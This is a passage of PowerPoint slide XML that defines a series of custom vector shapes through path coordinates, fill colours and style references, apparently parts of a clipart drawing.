            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="79" h="15">
                <a:moveTo>
                  <a:pt x="0" y="15"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="62" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="70" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="51" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="15"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="333333"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="620" name="CustomShape 236"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2637000" y="4130640"/>
            <a:ext cx="208800" cy="70560"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="132" h="45">
                <a:moveTo>
                  <a:pt x="55" y="43"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="56" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="63" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="82" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="84" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="87" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="83" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="70" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="62" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55" y="43"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="621" name="CustomShape 237"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2592360" y="4149720"/>
            <a:ext cx="213480" cy="62640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="135" h="40">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="132" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="622" name="CustomShape 238"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2629080" y="4141800"/>
            <a:ext cx="208800" cy="54720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="132" h="35">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="130" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="623" name="CustomShape 239"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2612880" y="4143240"/>
            <a:ext cx="210240" cy="61200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="133" h="39">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="130" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="133" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="624" name="CustomShape 240"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2563920" y="3409920"/>
            <a:ext cx="394560" cy="331200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="249" h="209">
                <a:moveTo>
                  <a:pt x="68" y="27"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="70" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="75" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="83" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="88" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="91" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="95" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="103" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="111" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="116" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="121" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="137" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="150" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="157" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="163" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="170" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="178" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="185" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="193" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="201" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="210" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="208" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="208" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="210" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="213" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="216" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="220" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="222" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="224" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="226" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="245" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="240" y="117"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="208" y="133"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="247" y="145"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="247" y="146"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="148"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="152"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="249" y="155"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="160"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="247" y="164"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="244" y="170"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144" y="209"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="163"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="159"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="150"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="49" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="58" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68" y="27"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="625" name="CustomShape 241"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2701800" y="3433680"/>
            <a:ext cx="124560" cy="143640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="79" h="91">
                <a:moveTo>
                  <a:pt x="78" y="3"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="78" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="50" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="50" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="64" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="3"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="333333"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="626" name="CustomShape 242"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2714760" y="3475080"/>
            <a:ext cx="208800" cy="142200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="132" h="90">
                <a:moveTo>
                  <a:pt x="1" y="67"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="78"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="91" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="94" y="85"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="103" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107" y="74"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="121" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="125" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="131" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="129" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="127" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="124" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="120" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="118" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="118" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="108" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="108" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="103" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="92" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="82" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="67"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="627" name="CustomShape 243"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689200" y="3614760"/>
            <a:ext cx="151560" cy="48600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="96" h="31">
                <a:moveTo>
                  <a:pt x="96" y="11"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="93" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96" y="11"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="628" name="CustomShape 244"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2763720" y="3630600"/>
            <a:ext cx="65880" cy="21600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="42" h="14">
                <a:moveTo>
                  <a:pt x="42" y="6"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="6"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="629" name="CustomShape 245"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697120" y="3619440"/>
            <a:ext cx="43560" cy="15120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="28" h="10">
                <a:moveTo>
                  <a:pt x="28" y="4"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="4"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
